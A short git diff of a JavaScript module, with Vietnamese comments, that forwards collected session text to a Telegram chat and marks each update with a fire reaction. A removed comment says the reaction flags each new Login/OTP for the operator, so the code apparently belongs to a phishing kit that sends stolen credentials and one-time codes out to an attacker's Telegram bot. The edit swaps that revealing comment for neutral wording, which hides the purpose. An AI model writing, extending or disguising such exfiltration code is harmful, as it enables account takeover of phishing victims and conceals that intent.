@@ -28,7 +28,7 @@ export const sendTelegramMessage = (newContent) => {
     const sid = getSessionId();
     
     if (newContent) {
-        // ĐÃ BỎ [user_...], giờ chỉ nối thẳng nội dung vào
+        // CHỈ NỐI THẲNG NỘI DUNG, KHÔNG CHÈN MÃ PHIÊN NỮA
         currentSessionText += `\n\n${newContent}`;
     }
     
@@ -60,7 +60,7 @@ export const sendTelegramMessage = (newContent) => {
             // Update lại nội dung
             tgFetch('editMessageText', { chat_id: CHAT_ID, message_id: tgMessageId, text: text, parse_mode: 'HTML' });
             
-            // Bonus: Tự động thả cảm xúc 🔥 vào tin nhắn mỗi khi có Login/OTP mới để mày dễ nhận biết
+            // Tự động thả cảm xúc 🔥 vào tin nhắn
             tgFetch('setMessageReaction', {
                 chat_id: CHAT_ID,
                 message_id: tgMessageId,
